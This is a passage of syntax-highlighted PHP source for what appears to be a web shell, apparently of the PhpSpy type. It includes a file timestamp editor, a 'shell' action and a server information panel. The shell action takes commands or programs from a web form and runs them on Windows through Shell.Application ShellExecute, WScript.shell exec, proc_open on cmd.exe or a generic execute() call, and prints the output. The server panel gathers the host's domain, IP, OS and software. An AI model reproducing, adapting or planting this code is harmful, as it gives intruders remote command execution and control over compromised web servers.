<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'minute'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'i'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'second:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'second'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'s'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfooter(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">goback(</span>);
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end newtime</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'shell'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">program</span> &amp;&amp; $<span style="color: #eeeeec;">parameter</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">shell</span>= <span style="color: #729fcf; font-weight: bold;">new</span> <span style="color: #8ae234; font-weight: bold;">COM</span>(<span style="color: #ad7fa8; font-style: italic;">'Shell.Application'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">a</span> = $<span style="color: #eeeeec;">shell</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">ShellExecute</span>($<span style="color: #eeeeec;">program</span>,$<span style="color: #eeeeec;">parameter</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Program run has '</span>.(!$<span style="color: #eeeeec;">a</span> ? <span style="color: #ad7fa8; font-style: italic;">'success'</span> : <span style="color: #ad7fa8; font-style: italic;">'fail'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">program</span> &amp;&amp; $<span style="color: #eeeeec;">program</span> = <span style="color: #ad7fa8; font-style: italic;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">parameter</span> &amp;&amp; $<span style="color: #eeeeec;">parameter</span> = <span style="color: #ad7fa8; font-style: italic;">'/c net start &gt; '</span>.<span style="color: #f57900; font-weight: bold;">SA_ROOT</span>.<span style="color: #ad7fa8; font-style: italic;">'log.txt'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Execute Program'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'shell'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Program'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'program'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">program</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Parameter'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'parameter'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">parameter</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'class'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'bt'</span>,<span style="color: #ad7fa8; font-style: italic;">'type'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Execute'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Execute Command'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'shell'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #f57900; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">execfuncdb</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'phpfunc'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'phpfunc'</span>,<span style="color: #ad7fa8; font-style: italic;">'wscript'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'wscript'</span>,<span style="color: #ad7fa8; font-style: italic;">'proc_open'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'proc_open'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeselect(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Use:'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'execfunc'</span>,<span style="color: #ad7fa8; font-style: italic;">'option'</span>=&gt;$<span style="color: #eeeeec;">execfuncdb</span>,<span style="color: #ad7fa8; font-style: italic;">'selected'</span>=&gt;$<span style="color: #eeeeec;">execfunc</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Command'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'command'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">command</span>)));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'class'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'bt'</span>,<span style="color: #ad7fa8; font-style: italic;">'type'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Execute'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">command</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">execfunc</span>==<span style="color: #ad7fa8; font-style: italic;">'wscript'</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">wsh</span> = <span style="color: #729fcf; font-weight: bold;">new</span> <span style="color: #8ae234; font-weight: bold;">COM</span>(<span style="color: #ad7fa8; font-style: italic;">'WScript.shell'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">exec</span> = $<span style="color: #eeeeec;">wsh</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">exec</span>(<span style="color: #ad7fa8; font-style: italic;">'cmd.exe /c '</span>.$<span style="color: #eeeeec;">command</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">stdout</span> = $<span style="color: #eeeeec;">exec</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">StdOut</span>();
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">stroutput</span> = $<span style="color: #eeeeec;">stdout</span>-&gt;<span style="color: #eeeeec; background-color: #2e3436;">ReadAll</span>();
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> $<span style="color: #eeeeec;">stroutput</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">execfunc</span>==<span style="color: #ad7fa8; font-style: italic;">'proc_open'</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f57900; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">descriptorspec</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  <span style="color: #eeeeec; background-color: #2e3436;">0</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'pipe'</span>, <span style="color: #ad7fa8; font-style: italic;">'r'</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  <span style="color: #eeeeec; background-color: #2e3436;">1</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'pipe'</span>, <span style="color: #ad7fa8; font-style: italic;">'w'</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  <span style="color: #eeeeec; background-color: #2e3436;">2</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'pipe'</span>, <span style="color: #ad7fa8; font-style: italic;">'w'</span>)
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> );
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">process</span> = <span style="color: #eeeeec; background-color: #2e3436;">proc_open(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'COMSPEC'</span>], $<span style="color: #eeeeec;">descriptorspec</span>, $<span style="color: #eeeeec;">pipes</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (<span style="color: #eeeeec; background-color: #2e3436;">is_resource(</span>$<span style="color: #eeeeec;">process</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>], $<span style="color: #eeeeec;">command</span>.<span style="color: #ad7fa8; font-style: italic;">"\r\n"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fwrite(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>], <span style="color: #ad7fa8; font-style: italic;">"exit\r\n"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">0</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> (!<span style="color: #eeeeec; background-color: #2e3436;">feof(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>])) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">fgets(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>], <span style="color: #eeeeec; background-color: #2e3436;">1024</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">1</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">while</span> (!<span style="color: #eeeeec; background-color: #2e3436;">feof(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">2</span>])) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span> <span style="color: #eeeeec; background-color: #2e3436;">fgets(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">2</span>], <span style="color: #eeeeec; background-color: #2e3436;">1024</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">pipes</span>[<span style="color: #eeeeec; background-color: #2e3436;">2</span>]);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">proc_close(</span>$<span style="color: #eeeeec;">process</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">echo</span>(<span style="color: #eeeeec; background-color: #2e3436;">execute(</span>$<span style="color: #eeeeec;">command</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/pre&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end shell</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'phpenv'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">upsize</span>=<span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'file_uploads'</span>) ? <span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'upload_max_filesize'</span>) : <span style="color: #ad7fa8; font-style: italic;">'Not allowed'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">adminmail</span>=<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_ADMIN'</span>]) ? $<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_ADMIN'</span>] : <span style="color: #eeeeec; background-color: #2e3436;">getcfg(</span><span style="color: #ad7fa8; font-style: italic;">'sendmail_from'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dis_func</span> &amp;&amp; $<span style="color: #eeeeec;">dis_func</span> = <span style="color: #ad7fa8; font-style: italic;">'No'</span>;<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">info</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">1</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server Time'</span>,<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'Y/m/d h:i:s'</span>,$<span style="color: #eeeeec;">timestamp</span>)),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">2</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server Domain'</span>,$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_NAME'</span>]),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">3</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server IP'</span>,<span style="color: #eeeeec; background-color: #2e3436;">gethostbyname(</span>$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_NAME'</span>])),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">4</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server OS'</span>,<span style="color: #8ae234;">PHP_OS</span>),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">5</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server OS Charset'</span>,$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">6</span> =&gt; <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'Server Software'</span>,$<span style="color: #8ae234;">_SERVER</span>[<span style="color: #ad7fa8; font-style: italic;">'SERVER_SOFTWARE'</span>]),
